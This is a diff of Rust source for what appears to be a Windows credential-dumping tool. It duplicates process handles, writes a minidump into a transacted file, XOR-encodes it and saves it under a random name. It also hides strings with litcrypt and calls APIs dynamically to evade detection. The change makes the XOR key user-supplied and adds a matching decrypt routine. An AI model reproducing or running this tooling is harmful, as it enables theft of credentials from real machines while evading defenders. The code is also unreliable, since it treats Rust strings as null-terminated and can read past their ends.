@@ -5,6 +5,8 @@ extern crate litcrypt;
 use_litcrypt!();
 
 use litcrypt::lc;
+use rand::{thread_rng, Rng};
+use rand::distributions::Alphanumeric;
 use core::panic;
 use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
 use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
@@ -12,7 +14,7 @@ use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileS
 
 
 // #[no_mangle]
-pub fn dump() {
+pub fn dump(key: &str) {
 
     unsafe 
     {
@@ -307,8 +309,14 @@ pub fn dump() {
                             let func: CreateFileTransactedA;
                             let ret: Option<HANDLE>;
                             let mini: *const u32 = std::mem::transmute(&0xffff);
-                            let s = format!(".\\test{}.log",rand::random::<char>());
-                            let file_name = s.as_ptr() as *mut u8;
+                            let rand_string: String = thread_rng()
+                            .sample_iter(&Alphanumeric)
+                            .take(7)
+                            .map(char::from)
+                            .collect();
+
+                            let file_name = format!(".\\{}{}", rand_string, ".log");
+                            let file_name = file_name.as_ptr() as *mut u8;
                             dinvoke::dynamic_invoke!(
                                 kernel32,
                                 &lc!("CreateFileTransactedW"),
@@ -341,21 +349,6 @@ pub fn dump() {
                                     }
                                 None => {shtei = shtei.add(1); continue;},
                             }
-
-                            /*if transacted_file.0 == -1
-                            {
-                                let f: GetLastError;
-                                let r: Option<u32>;
-                                dinvoke::dynamic_invoke!(
-                                    kernel32,
-                                    "GetLastError",
-                                    f,
-                                    r,
-                                );
-
-                                println!("Error: {}", r.unwrap());
-                                break;
-                            }*/
 
                             let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
                             let func: MiniDumpWriteDump;
@@ -442,16 +435,36 @@ pub fn dump() {
                                         );
 
                                         let mut view_ptr = ret.unwrap() as *mut u8;
-                                        let key: u8 = 'p' as u8;
+
+                                        let mut key_ptr = key.as_ptr();
+                                        let mut xor_key: u8 = *key_ptr;
+                                        key_ptr = key_ptr.add(1);
+                                        while *key_ptr != '\0' as u8
+                                        {
+                                            xor_key = xor_key ^ *key_ptr;
+                                            key_ptr = key_ptr.add(1);
+                                        }
+
+
                                         let mut view_xor: Vec<u8> = vec![];
                                         for _i in 0..dump_size
                                         {
-                                            view_xor.push(*view_ptr ^ key);
+                                            view_xor.push(*view_ptr ^ xor_key);
                                             view_ptr = view_ptr.add(1);
                                         }
 
-                                        let mut file = std::fs::File::create(&lc!("foo2.txt")).unwrap();
+
+                                        let rand_string: String = thread_rng()
+                                            .sample_iter(&Alphanumeric)
+                                            .take(7)
+                                            .map(char::from)
+                                            .collect();
+
+                                        let file_name = format!("{}{}", rand_string, ".txt");
+                                        let mut file = std::fs::File::create(&file_name).unwrap();
                                         let _r = file.write(&view_xor).unwrap();
+
+                                        println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());
 
                                         let func: UnmapViewOfFile;
                                         let ret2: Option<BOOL>;
@@ -485,7 +498,6 @@ pub fn dump() {
                                         }
 
                                         let _r = dinvoke::close_handle(*dup_handle).unwrap();
-                                       // let _r = dinvoke::close_handle(file_handle).unwrap();
                                         let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                         let _r = dinvoke::close_handle(map_handle).unwrap();
                                         let _r = dinvoke::close_handle(transaction_handle).unwrap();
@@ -505,34 +517,45 @@ pub fn dump() {
 
             if x == (*shi).number_of_handles - 1
             {
-                println!("{}",&lc!("[x] Execution failed. Exiting."));
+                println!("{}", &lc!("[x] Execution failed. Exiting."));
             }
         }            
     }
 }
 
 
-pub fn decrypt () 
+pub fn decrypt (file_path: &str, key: &str, output_file: &str) 
 {
-    let mut f = File::open("foo2.txt").unwrap();
-    let metadata = fs::metadata("foo2.txt").expect("unable to read metadata");
-    let mut buffer = vec![];
-    f.read_to_end(&mut buffer).expect("buffer overflow");
-
-
-    let mut dir = buffer.as_ptr();
-    //let vv: Vec<u8> = Vec::from_raw_parts(dir, size as usize, size as usize);
-    let c: u8 = 'p' as u8;
-    let mut vv2: Vec<u8> = vec![];
     unsafe{
-        for _i in 0..metadata.len()
+
+        let mut file = File::open(file_path).expect("[x] Error opening input file.");
+        let metadata = fs::metadata(file_path).unwrap();
+        let mut buffer = vec![];
+        file.read_to_end(&mut buffer).unwrap();
+
+
+        let mut buffer_ptr = buffer.as_ptr();
+
+        let mut key_ptr = key.as_ptr();
+        let mut xor_key: u8 = *key_ptr;
+        key_ptr = key_ptr.add(1);
+        while *key_ptr != '\0' as u8
         {
-            vv2.push(*dir ^ c);
-            dir = dir.add(1);
+            xor_key = xor_key ^ *key_ptr;
+            key_ptr = key_ptr.add(1);
         }
 
-    let mut f2 = std::fs::File::create("foo3.txt").unwrap();
-    let _rr = f2.write_all(&vv2).unwrap();
+        let mut file_content: Vec<u8> = vec![];
+        for _i in 0..metadata.len()
+        {
+            file_content.push(*buffer_ptr ^ xor_key);
+            buffer_ptr = buffer_ptr.add(1);
+        }
+
+        let mut output = std::fs::File::create(output_file).unwrap();
+        let _r = output.write_all(&file_content).unwrap();
     }
+
+    println!("{}", &lc!("[+] Successfully unencrypted minidump file."))
 
 }
